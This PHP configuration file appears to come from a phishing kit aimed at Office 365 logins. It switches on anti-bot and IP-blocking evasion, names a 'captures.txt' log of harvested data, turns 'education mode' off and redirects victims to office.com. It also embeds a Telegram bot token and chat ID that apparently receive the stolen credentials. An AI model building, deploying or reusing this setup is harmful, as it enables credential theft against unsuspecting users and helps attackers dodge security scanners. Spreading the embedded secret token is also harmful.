<?php
// config.php - Configuration file

// Only start session if not already started
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// ==========================================
// ANTI-BOT CONFIGURATION
// ==========================================

// Enable/disable IP blocking (for ipblock.php)
$ip_blocking_enabled = true;

// Enable/disable anti-bot checks (for bot-check.php)
$anti_bot_enabled = true;

// ==========================================
// PATH DEFINITIONS
// ==========================================

define('BASE_PATH', __DIR__);
define('ANTI_BOT_PATH', BASE_PATH . '/anti-bot/');
define('LOGS_PATH', BASE_PATH . '/logs/');

// Create logs directory if it doesn't exist
if (!file_exists(LOGS_PATH)) {
    mkdir(LOGS_PATH, 0777, true);
}

// ==========================================
// TELEGRAM CONFIGURATION
// ==========================================

define('TELEGRAM_BOT_TOKEN', '7567795260:AAF5_mqybW1xatPFML_Op4qLiKan7FrSLv4');
define('TELEGRAM_CHAT_ID', '5821459852');

// ==========================================
// FILE PATHS
// ==========================================

define('LOG_FILE', LOGS_PATH . 'captures.txt');

// ==========================================
// EDUCATIONAL MODE
// ==========================================

define('EDUCATION_MODE', false);

// ==========================================
// REDIRECT URL (ADD THIS LINE)
// ==========================================

define('REDIRECT_URL', 'office.com');
?>